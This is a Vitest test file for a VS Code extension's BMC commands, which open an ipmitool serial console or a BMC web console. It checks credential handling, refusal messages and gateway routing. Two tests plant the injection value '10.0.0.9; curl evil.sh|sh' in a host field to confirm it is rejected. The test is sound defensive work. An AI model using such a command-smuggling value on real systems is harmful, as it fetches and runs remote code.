import { beforeEach, describe, expect, it, vi } from "vitest";
import type { AuthProfile, ServerConfig } from "../../src/models/config";
import type { CommandContext } from "../../src/commands/types";

/**
 * Issue #48 §3.6 — the two direct BMC actions on a server item.
 *
 * The property under test throughout is that these commands are the shipped
 * templates' own flow with the picker removed: same substitution chokepoint,
 * same typed refusals, same credential pathway (environment, never argv) — and
 * that the web console's scheme comes from a two-valued field rather than from
 * whatever string a record happens to carry.
 */

const registeredCommands = new Map<string, (...args: unknown[]) => unknown>();
const showQuickPick = vi.fn();
const showErrorMessage = vi.fn();
const showWarningMessage = vi.fn();
const setStatusBarMessage = vi.fn();
const showInputBox = vi.fn();
const executeCommand = vi.fn();
const openExternal = vi.fn(async () => true);
const createdTerminals: Array<{ name: string; sent: string[]; env?: Record<string, string>; options: Record<string, unknown> }> = [];
// The open-terminal set backing `vscode.window.terminals`, so a pinned session
// target's isStillValid() re-check (P5) can be exercised — a terminal absent here
// reads as closed. Populated by gatewayContext from its seeded session terminals.
let openTerminals: unknown[] = [];

vi.mock("vscode", () => ({
  commands: {
    registerCommand: vi.fn((id: string, handler: (...args: unknown[]) => unknown) => {
      registeredCommands.set(id, handler);
      return { dispose: vi.fn() };
    }),
    executeCommand: (...args: unknown[]) => executeCommand(...args)
  },
  window: {
    showQuickPick: (...args: unknown[]) => showQuickPick(...args),
    showErrorMessage: (...args: unknown[]) => showErrorMessage(...args),
    showWarningMessage: (...args: unknown[]) => showWarningMessage(...args),
    showInformationMessage: vi.fn(),
    setStatusBarMessage: (...args: unknown[]) => setStatusBarMessage(...args),
    showInputBox: (...args: unknown[]) => showInputBox(...args),
    createInputBox: vi.fn(),
    createTerminal: vi.fn((options: { name: string; env?: Record<string, string> }) => {
      const record = { name: options.name, sent: [] as string[], env: options.env, options: { ...options } };
      createdTerminals.push(record);
      return {
        name: options.name,
        show: vi.fn(),
        sendText: (text: string) => record.sent.push(text)
      };
    }),
    get terminals() {
      return openTerminals;
    },
    activeTerminal: undefined as unknown
  },
  env: {
    openExternal: (...args: unknown[]) => openExternal(...args)
  },
  Uri: {
    parse: (value: string) => ({ toString: () => value, value })
  },
  QuickInputButtons: { Back: {} }
}));

const pickServer = vi.fn();
vi.mock("../../src/commands/serverCommands", () => ({
  pickServer: (...args: unknown[]) => pickServer(...args),
  connectServer: vi.fn(async () => {}),
  toServerFromArg: (_core: unknown, arg: unknown) =>
    arg && typeof arg === "object" && "server" in arg ? (arg as { server: ServerConfig }).server : undefined
}));

import { connectBmcSol, openBmcWebConsole, registerBmcCommands } from "../../src/commands/bmcCommands";

function server(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Core Switch",
    host: "10.1.2.3",
    port: 22,
    username: "admin",
    authType: "password",
    isHidden: false,
    ipmiHost: "10.0.0.9",
    ipmiAuthProfileId: "ap-bmc",
    ...overrides
  };
}

function authProfile(overrides: Partial<AuthProfile> = {}): AuthProfile {
  return { id: "ap-bmc", name: "BMC accounts", username: "bmc-operator", authType: "password", ...overrides };
}

function context(secrets: Record<string, string> = {}, profiles: AuthProfile[] = [authProfile()]): CommandContext {
  return {
    core: {
      getSnapshot: () => ({ activeSessions: [], servers: [] }),
      getAuthProfile: (id: string) => profiles.find((p) => p.id === id),
      onDidChange: () => () => {}
    },
    sessionTerminals: new Map(),
    secretVault: {
      get: async (key: string) => secrets[key],
      store: async () => {},
      delete: async () => {}
    }
  } as unknown as CommandContext;
}

const VAULTED = { "auth-profile-password-ap-bmc": "s3cr3t-bmc" };

function openedUrl(): string {
  return (openExternal.mock.calls[0][0] as unknown as { value: string }).value;
}

beforeEach(() => {
  registeredCommands.clear();
  showQuickPick.mockReset();
  showErrorMessage.mockReset();
  showWarningMessage.mockReset();
  setStatusBarMessage.mockReset();
  showInputBox.mockReset();
  executeCommand.mockReset();
  openExternal.mockClear();
  openExternal.mockResolvedValue(true as unknown as never);
  pickServer.mockReset();
  createdTerminals.length = 0;
  openTerminals = [];
});

describe("nexus.server.connectBmcSol", () => {
  it("spawns a terminal with the credential env and the -E SOL line, WITHOUT showing a macro picker", async () => {
    await connectBmcSol(context(VAULTED), { server: server() });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].env).toEqual({
      IPMITOOL_PASSWORD: "s3cr3t-bmc",
      IPMI_PASSWORD: "s3cr3t-bmc"
    });
    expect(createdTerminals[0].sent).toEqual([
      " ipmitool -I lanplus -H 10.0.0.9 -U bmc-operator -E sol activate\n"
    ]);
    // The whole point of the command is that it is not the picker: an
    // implementation that merely opens `Run Macro on Server…` pre-filtered
    // fails here.
    expect(showQuickPick).not.toHaveBeenCalled();
    // The §3.5 invariant, re-asserted because this is a SECOND call site for the
    // same secret.
    expect(createdTerminals[0].sent[0]).not.toContain("s3cr3t-bmc");
  });

  it("refuses with the typed missing-field error and the Edit Server route when the server has no IPMI host", async () => {
    showErrorMessage.mockResolvedValue("Edit Server");
    const target = server({ ipmiHost: undefined });

    // NO stored password, deliberately: that is what makes the ORDER
    // observable. An implementation that resolves the credential first prompts
    // the user for a BMC password and only then tells them the server has no
    // BMC address — a dialog for a run that was never going to happen.
    await connectBmcSol(context({}), { server: target });

    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI / BMC Host");
    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
    // Refused BEFORE any credential is read or prompted for.
    expect(showInputBox).not.toHaveBeenCalled();
  });

  it("refuses when no IPMI auth profile is linked, naming the field to set", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    await connectBmcSol(context(VAULTED, []), { server: server({ ipmiAuthProfileId: undefined }) });

    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI Auth Profile");
  });

  it("C1 — the missing-host refusal names the COMMAND, not 'this macro', and says nothing was run", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    await connectBmcSol(context({}), { server: server({ ipmiHost: undefined }) });

    const msg = String(showErrorMessage.mock.calls[0][0]);
    // A menu click has no macro — the pre-fix copy said "…but this macro uses
    // ${profile.ipmiHost}", which is nonsense here.
    expect(msg).not.toContain("this macro");
    expect(msg).not.toContain("${profile.ipmiHost}");
    expect(msg).toContain("Connect BMC Serial Console needs it");
    expect(msg).toContain("Nothing was run.");
  });

  it("C1 — the ipmiUsername-missing refusal is also command-subject phrased", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    // No linked profile → ${profile.ipmiUsername} cannot resolve.
    await connectBmcSol(context(VAULTED, []), { server: server({ ipmiAuthProfileId: undefined }) });

    const msg = String(showErrorMessage.mock.calls[0][0]);
    expect(msg).not.toContain("this macro");
    expect(msg).toContain("Connect BMC Serial Console needs it");
    expect(msg).toContain("Nothing was run.");
  });

  it("C1 — the charset-invalid refusal ends with the command's outcome, not 'sent'", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    await connectBmcSol(context(VAULTED), { server: server({ ipmiHost: "10.0.0.9; curl evil.sh|sh" }) });

    const msg = String(showErrorMessage.mock.calls[0][0]);
    expect(msg).toContain("can't be placed in a command or URL");
    expect(msg).toContain("Nothing was run.");
    expect(msg).not.toContain("Nothing was sent.");
  });

  it("refuses a hostile stored ipmiHost — the chokepoint applies here exactly as in a macro run", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    await connectBmcSol(context(VAULTED), { server: server({ ipmiHost: "10.0.0.9; curl evil.sh|sh" }) });

    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("can't be placed in a command");
  });

  it("prompts for the password when none is stored, and the answer lands in the env only", async () => {
    showInputBox.mockResolvedValue("typed-once");

    await connectBmcSol(context({}), { server: server() });

    expect((showInputBox.mock.calls[0][0] as { password?: boolean }).password).toBe(true);
    expect(createdTerminals[0].env).toEqual({ IPMITOOL_PASSWORD: "typed-once", IPMI_PASSWORD: "typed-once" });
    expect(createdTerminals[0].sent[0]).not.toContain("typed-once");
  });

  it("spawns nothing when that prompt is cancelled", async () => {
    showInputBox.mockResolvedValue(undefined);

    await connectBmcSol(context({}), { server: server() });

    expect(createdTerminals).toHaveLength(0);
    expect(String(setStatusBarMessage.mock.calls[0][0])).toContain("cancelled");
  });

  /**
   * Issue #48 PR-C (§3.6) — when the target names a reachable IPMI gateway, the
   * command honors it exactly as a `route: "ipmiGateway"` macro does: the `-a`
   * line is delivered into the GATEWAY's session terminal, no local terminal is
   * spawned, no credential is read (env can't cross the hop — ipmitool prompts on
   * the bastion), and no macro picker is shown.
   */
  function gatewayContext(opts: {
    servers: ServerConfig[];
    sessions?: Array<{ id: string; serverId: string }>;
    terminals?: Map<string, unknown>;
    secrets?: Record<string, string>;
    profiles?: AuthProfile[];
  }): CommandContext {
    // A pinned session target is re-checked against window.terminals before send
    // (isStillValid); seed the open set so the normal path is not read as closed.
    if (opts.terminals) {
      openTerminals = [...opts.terminals.values()];
    }
    return {
      core: {
        getSnapshot: () => ({ activeSessions: opts.sessions ?? [], servers: opts.servers }),
        getAuthProfile: (id: string) => (opts.profiles ?? [authProfile()]).find((p) => p.id === id),
        onDidChange: () => () => {}
      },
      sessionTerminals: opts.terminals ?? new Map(),
      secretVault: {
        get: async (key: string) => (opts.secrets ?? {})[key],
        store: async () => {},
        delete: async () => {}
      }
    } as unknown as CommandContext;
  }

  it("routes into the gateway's session with the -a form when ipmiGatewayServerId is set — no local terminal, no picker, no credential read", async () => {
    const target = server({ id: "srv-1", name: "Core Switch", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion", ipmiHost: "10.9.9.9" });
    const gwSent: string[] = [];
    const show = vi.fn();
    const gwTerminal = { name: "Nexus SSH: Bastion", show, sendText: (text: string) => gwSent.push(text) };
    const ctx = gatewayContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]]),
      secrets: VAULTED
    });

    await connectBmcSol(ctx, { server: target });

    // `-a`, resolved against the TARGET (10.0.0.9), delivered to the gateway.
    expect(gwSent).toEqual([" ipmitool -I lanplus -H 10.0.0.9 -U bmc-operator -a sol activate\n"]);
    // Never a local terminal (which is the `-E` local flow), never the picker.
    expect(createdTerminals).toHaveLength(0);
    expect(showQuickPick).not.toHaveBeenCalled();
    // Env cannot cross the hop, so no credential is read or prompted for, and the
    // §3.5 no-secret invariant holds — the `-a` line carries no password.
    expect(showInputBox).not.toHaveBeenCalled();
    expect(gwSent[0]).not.toContain("s3cr3t-bmc");
    expect(gwSent[0]).not.toContain(" -E ");
    // B2 — the gateway session is revealed on delivery (the `-a` prompt is hidden
    // until focused) and a status line names where the command went.
    expect(show).toHaveBeenCalled();
    const status = setStatusBarMessage.mock.calls.map((c) => String(c[0])).join("\n");
    expect(status).toContain('SOL console command sent to "Bastion"');
    expect(status).toContain("ipmitool will prompt for the BMC password there");
  });

  it("P5 — does not send silently when the gateway session was closed during the QuickPick", async () => {
    // The pinned target's isStillValid() re-check: a terminal absent from
    // window.terminals is treated as closed, so the send is skipped and reported
    // rather than swallowed.
    const target = server({ id: "srv-1", name: "Core Switch", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion", ipmiHost: "10.9.9.9" });
    const gwSent: string[] = [];
    // Open at resolve time (exitStatus undefined, so it is picked as the target)...
    const gwTerminal = { name: "Nexus SSH: Bastion", show: vi.fn(), sendText: (text: string) => gwSent.push(text) };
    const ctx = gatewayContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]]),
      secrets: VAULTED
    });
    // ...then gone from window.terminals by send time — isStillValid() reads it as closed.
    openTerminals = [];

    await connectBmcSol(ctx, { server: target });

    // Nothing sent; the closed-session outcome is reported, not silent.
    expect(gwSent).toEqual([]);
    const status = setStatusBarMessage.mock.calls.map((c) => String(c[0])).join("\n");
    expect(status).toContain("the gateway session closed");
  });

  /**
   * SAFETY (Codex P1) — when the target NAMES a gateway that is now unavailable
   * (deleted so the id dangles, or downgraded to addressless during inventory
   * sync), the direct BMC command must ABORT, never fall back to the local `-E`
   * terminal. Dialing the BMC from THIS machine can reach a DIFFERENT device on
   * an overlapping private address; for chassis/power control that is the wrong
   * box. Distinct from a target with NO gateway configured, where local IS the
   * configured route (see the "does NOT warn when NO gateway" case below).
   *
   *  ⊘ collapse unavailable→local (old warn-then-run-locally path) — a local
   *    terminal is created, no abort error → these fail
   *  ⊘ abort when NO gateway configured — the "no gateway ⇒ local" case fails
   */
  it("ABORTS — no local -E terminal — when the configured gateway is deleted (id dangles)", async () => {
    const ctx = gatewayContext({ servers: [], secrets: VAULTED });
    await connectBmcSol(ctx, { server: server({ ipmiGatewayServerId: "ghost" }) });

    // Nothing dialed from here — the unsafe local fall-back is gone.
    expect(createdTerminals).toHaveLength(0);
    expect(showErrorMessage).toHaveBeenCalledTimes(1);
    const err = String(showErrorMessage.mock.calls[0][0]);
    expect(err).toContain("Core Switch");
    expect(err).toContain("unavailable");
  });

  it("ABORTS — no local -E terminal — when the configured gateway is ADDRESSLESS", async () => {
    const target = server({ id: "srv-1", name: "Core Switch", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "stopped-gw", host: "", addressless: true });
    const ctx = gatewayContext({ servers: [target, gateway], secrets: VAULTED });

    await connectBmcSol(ctx, { server: target });

    expect(createdTerminals).toHaveLength(0);
    expect(showErrorMessage).toHaveBeenCalledTimes(1);
    const err = String(showErrorMessage.mock.calls[0][0]);
    expect(err).toContain("Core Switch");
    expect(err).toContain("unavailable");
  });

  it("Codex round 7 P2 — does NOT warn when NO gateway is configured (local is the configured route)", async () => {
    // ipmiGatewayServerId unset: local delivery is correct, not a broken-config
    // fallback — no warning must appear.
    await connectBmcSol(context(VAULTED), { server: server() });

    expect(showWarningMessage).not.toHaveBeenCalled();
    expect(createdTerminals).toHaveLength(1);
  });

  it("Codex round 7 P2 — does NOT warn when the configured gateway RESOLVES (gateway path)", async () => {
    const target = server({ id: "srv-1", name: "Core Switch", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion", ipmiHost: "10.9.9.9" });
    const gwTerminal = { name: "Nexus SSH: Bastion", show: vi.fn(), sendText: vi.fn() };
    const ctx = gatewayContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]]),
      secrets: VAULTED
    });

    await connectBmcSol(ctx, { server: target });

    // Gateway path taken — no broken-config warning, no local terminal.
    expect(showWarningMessage).not.toHaveBeenCalled();
    expect(createdTerminals).toHaveLength(0);
  });
});

describe("nexus.server.openBmcWebConsole", () => {
  it("defaults to https when the server carries no bmcWebProtocol", async () => {
    await openBmcWebConsole(context(), { server: server({ bmcWebProtocol: undefined }) });

    expect(openedUrl()).toBe("https://10.0.0.9/");
  });

  it('uses http when the server says exactly "http"', async () => {
    await openBmcWebConsole(context(), { server: server({ bmcWebProtocol: "http" }) });

    expect(openedUrl()).toBe("http://10.0.0.9/");
  });

  it.each([["HTTPS"], ["ftp"], ["javascript"], [""], [7], [null]])(
    "falls back to https for a garbage stored protocol (%o) instead of interpolating it (kills a direct read of the stored value)",
    async (raw) => {
      await openBmcWebConsole(context(), {
        server: server({ bmcWebProtocol: raw as unknown as "http" })
      });

      // An implementation that interpolates the field would produce
      // `ftp://10.0.0.9/` or `javascript://10.0.0.9/` — an imported record
      // choosing the scheme outright.
      expect(openedUrl()).toBe("https://10.0.0.9/");
    }
  );

  it.each([
    ["https" as const, "https://[fe80::1]/"],
    ["http" as const, "http://[fe80::1]/"]
  ])("brackets a bare IPv6 authority under %s", async (protocol, expected) => {
    await openBmcWebConsole(context(), { server: server({ ipmiHost: "fe80::1", bmcWebProtocol: protocol }) });

    // Without bracketing, `new URL()` reads the address's colons as a port and
    // the open is refused — the failure the URL form of the substitution exists
    // to prevent.
    expect(openedUrl()).toBe(expected);
  });

  it("keeps an explicit port from the stored address", async () => {
    await openBmcWebConsole(context(), { server: server({ ipmiHost: "bmc.example.com:8443" }) });

    expect(openedUrl()).toBe("https://bmc.example.com:8443/");
  });

  it("refuses with the typed missing-field error when there is no IPMI host, and opens nothing", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    await openBmcWebConsole(context(), { server: server({ ipmiHost: undefined }) });

    expect(openExternal).not.toHaveBeenCalled();
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI / BMC Host");
  });

  it("C1 — the missing-host refusal names Open BMC Web Console and says nothing was opened", async () => {
    showErrorMessage.mockResolvedValue(undefined);

    await openBmcWebConsole(context(), { server: server({ ipmiHost: undefined }) });

    const msg = String(showErrorMessage.mock.calls[0][0]);
    expect(msg).not.toContain("this macro");
    expect(msg).toContain("Open BMC Web Console needs it");
    expect(msg).toContain("Nothing was opened.");
  });

  it("C5 — a resolved-but-unusable web address carries the Edit Server (Advanced) button", async () => {
    showErrorMessage.mockResolvedValue("Edit Server");
    // Charset-valid (digits, dots, one colon) but the URL parser rejects the
    // out-of-range port, so it resolves and then fails the http(s) whitelist —
    // the branch that used to be a plain error with no action.
    const target = server({ ipmiHost: "10.0.0.9:99999" });

    await openBmcWebConsole(context(), { server: target });

    expect(openExternal).not.toHaveBeenCalled();
    const msg = String(showErrorMessage.mock.calls[0][0]);
    expect(msg).toContain("does not form a usable web address");
    // The button and its Advanced-expanded route — the docs promise every
    // missing-piece error carries it.
    expect(showErrorMessage.mock.calls[0].slice(1)).toContain("Edit Server");
    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
  });

  it("needs no IPMI auth profile at all — the browser does its own login", async () => {
    await openBmcWebConsole(context({}, []), { server: server({ ipmiAuthProfileId: undefined }) });

    expect(openedUrl()).toBe("https://10.0.0.9/");
    // No auto-login, so no credential is read and nothing is prompted for.
    expect(showInputBox).not.toHaveBeenCalled();
  });

  it("reports an open the OS refused, and never claims success", async () => {
    openExternal.mockResolvedValueOnce(false as unknown as never);

    await openBmcWebConsole(context(), { server: server() });

    expect(showWarningMessage).toHaveBeenCalledTimes(1);
    expect(String(showWarningMessage.mock.calls[0][0])).toContain("Core Switch");
  });
});

describe("registerBmcCommands", () => {
  it("registers both commands under their contributed ids", () => {
    const disposables = registerBmcCommands(context());

    expect([...registeredCommands.keys()].sort()).toEqual([
      "nexus.server.connectBmcSol",
      "nexus.server.openBmcWebConsole"
    ]);
    expect(disposables).toHaveLength(2);
  });

  it("falls back to the server picker when invoked from the palette with no argument", async () => {
    pickServer.mockResolvedValue(server());
    registerBmcCommands(context(VAULTED));

    await registeredCommands.get("nexus.server.connectBmcSol")!();

    expect(pickServer).toHaveBeenCalledTimes(1);
    expect(createdTerminals).toHaveLength(1);
  });
});
